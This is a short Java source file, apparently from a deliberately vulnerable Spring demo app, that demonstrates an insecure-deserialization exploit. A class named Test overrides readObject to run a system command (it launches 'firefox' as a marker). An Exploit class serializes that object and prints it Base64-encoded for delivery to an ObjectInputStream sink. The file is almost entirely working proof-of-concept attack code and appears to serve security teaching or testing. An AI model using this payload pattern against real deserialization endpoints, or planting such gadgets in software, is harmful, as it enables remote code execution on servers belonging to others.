package org.example.springvulapp.insecuredeserialize.objectinputstream_sink;
import java.io.*;
import java.util.Base64;

class Test implements Serializable {
    private static final long serialVersionUID = -5949500227165244206L;
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        System.out.println("readObject called");
        Runtime.getRuntime().exec("firefox");
    }
}

public class Exploit{
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        Test test = new Test();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(test);
        oos.close();
        byte[] bytes = baos.toByteArray();
        String encoded = Base64.getEncoder().encodeToString(bytes);
        System.out.println(encoded);
    }
}